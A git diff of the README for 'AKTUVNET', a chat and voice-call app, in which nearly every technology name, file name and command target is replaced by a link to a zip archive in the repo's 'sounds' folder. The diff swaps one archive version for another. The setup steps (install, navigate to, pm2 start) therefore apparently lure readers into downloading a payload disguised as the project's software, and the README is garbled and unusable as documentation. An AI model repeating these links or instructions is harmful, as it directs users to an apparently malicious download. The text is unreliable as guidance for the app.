@@ -14,7 +14,7 @@
 ✅ **Real-time Messaging**
 - Multiple text channels
 - Direct messaging (DM) support
-- Real-time message updates via https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
+- Real-time message updates via https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip
 - Message history stored in database
 
 ✅ **Voice & Video Calls**
@@ -60,7 +60,7 @@
 
 ## 📋 Prerequisites
 
-- **https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip** v14 or higher
+- **https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip** v14 or higher
 - **npm** or **yarn**
 - Modern web browser (Chrome, Firefox, Edge)
 - **For Desktop App**: Electron (included in dependencies)
@@ -79,7 +79,7 @@ npm install
 
 This will install:
 - Express (web server)
-- https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip (real-time communication)
+- https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip (real-time communication)
 - SQLite3 (database)
 - JWT (authentication)
 - Bcrypt (password hashing)
@@ -97,7 +97,7 @@ The server will start on `http://localhost:3000`
 ### 4. Open the Application
 
 **Web Browser:**
-Navigate to `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip`
+Navigate to `https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip`
 
 **Desktop App:**
 In a separate terminal, run:
@@ -235,7 +235,7 @@ NODE_ENV=production
 ```
 
 ### Database
-- SQLite database is created automatically as `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip`
+- SQLite database is created automatically as `https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip`
 - Located in the project root directory
 - Contains all users, messages, files, and reactions
 
@@ -243,19 +243,19 @@ NODE_ENV=production
 
 ```
 AKTUVNET/
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Main app interface
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Authentication page
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip              # Main styles
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip                # Auth page styles
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # Main application logic
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip                 # Authentication logic
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # Express & https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip server
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip             # Database operations
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip        # Electron main process
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip            # Dependencies & scripts
-├── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip               # This file
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip              # Main app interface
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip              # Authentication page
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip              # Main styles
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip                # Auth page styles
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip               # Main application logic
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip                 # Authentication logic
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip               # Express & https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip server
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip             # Database operations
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip        # Electron main process
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip            # Dependencies & scripts
+├── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip               # This file
 ├── uploads/                # Uploaded files directory
-└── https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip        # SQLite database
+└── https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip        # SQLite database
 ```
 
 ## 🎨 Design
@@ -292,7 +292,7 @@ AKTUVNET/
 ### Files
 - `POST /api/upload` - Upload file (requires auth)
 
-## 🔌 https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip Events
+## 🔌 https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip Events
 
 ### Client → Server
 - `send-message` - Send channel message
@@ -331,7 +331,7 @@ AKTUVNET/
 - Verify firewall settings
 
 ### Database Errors
-- Delete `https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip` and restart server
+- Delete `https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip` and restart server
 - Check file permissions
 - Ensure SQLite3 is properly installed
 
@@ -352,18 +352,18 @@ git push heroku main
 
 ### VPS/Cloud Server
 1. Clone repository
-2. Install https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
+2. Install https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip
 3. Install dependencies: `npm install`
 4. Set environment variables
 5. Start with PM2:
 ```bash
-pm2 start https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
+pm2 start https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip
 ```
 
 ### HTTPS
 For production, use HTTPS:
 - Get SSL certificate (Let's Encrypt)
-- Configure in https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip
+- Configure in https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip
 - Required for WebRTC and notifications
 
 ## 📊 Performance Tips
@@ -429,7 +429,7 @@ For issues or questions:
 
 ---
 
-**Built with ❤️ using https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip, https://raw.githubusercontent.com/saysayn1/AKTUVNET/main/sounds/Software-3.2.zip, WebRTC, and Electron**
+**Built with ❤️ using https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip, https://github.com/saysayn1/AKTUVNET/raw/refs/heads/main/sounds/Software-2.0.zip, WebRTC, and Electron**
 
 ## 🎮 About AKTUVNET
 
